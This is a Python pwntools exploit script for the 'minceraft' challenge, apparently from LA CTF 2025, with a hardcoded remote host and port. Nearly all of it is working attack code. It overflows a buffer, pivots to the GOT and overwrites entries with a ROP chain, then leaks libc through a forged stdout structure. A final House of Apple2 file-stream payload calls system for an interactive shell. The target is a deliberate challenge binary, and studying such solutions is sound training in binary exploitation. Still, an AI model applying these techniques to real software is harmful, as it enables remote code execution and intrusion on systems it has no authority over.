#!/usr/bin/env python3
from pwn import *
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#└─# pwn checksec chall_patched
#[*] '/home/kali/Windows/LA CTF 2025/pwn/minceraft/chall_patched'
#    Arch:       amd64-64-little
#    RELRO:      Partial RELRO
#    Stack:      No canary found
#    NX:         NX enabled
#    PIE:        No PIE (0x400000)
#    Stripped:   No

def exploit():
    #Corgo script not my script
    global io
    io = initialize()
    got = 0x404000
    offset = 64
    rop = ROP(elf)
    payload = flat({offset: [got + 0x30 + 0x18, elf.sym["main"] + 4]}) #pivot to got
    io.sendlineafter("2. Multiplayer\n", "1")
    io.sendlineafter(b"Enter world name:\n", payload) 
    io.sendlineafter(b"2. Creative\n", "1")
    io.sendlineafter("2. Exit\n", "2")

    # Overwrite GOT
    rop = ROP(elf)
    rop.call(elf.plt["gets"]) #setvbuf -> gets
    rop.call(elf.plt["gets"]+6) #gets -> gets
    rop.call(elf.plt["__isoc99_scanf"]+6) #scanf -> scanf
    rop.call(elf.plt["exit"]+6) #exit -> exit
    rop.call(elf.sym["main"]) #sleep -> main
    payload = flat(rop.chain())
    io.sendlineafter("2. Multiplayer\n", "1")
    io.sendlineafter(b"Enter world name:\n", payload) #gets(setvbuf@got)
    io.sendafter(b"2. Creative\n", "1")

    #setvbuf(stdout) -> gets(stdout)
    io.send(p64(0xfbad1887) + p64(0)*3 + p64(got) + p64(got+100)*3 + p64(got+100+1))
    io.sendlineafter(b'Creating new world\n',b'1')

    puts = u64(io.recv(8))
    libc.address = puts - libc.sym["puts"]
    log.info("Puts: %#x", puts)
    log.info("Libc base: %#x", libc.address)

    #Getting shell FSOP stdout
    payload = IO_FILE_plus_struct().house_of_apple2_execmd_when_do_IO_operation(
        libc.sym['_IO_2_1_stdout_'],
        libc.sym['_IO_wfile_jumps'],
        libc.sym['system'])
    io.sendlineafter("2. Multiplayer\n", "1")
    io.sendlineafter(b"Enter world name:\n", "anythin")
    io.sendafter(b"2. Creative\n", "1")
    io.send(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
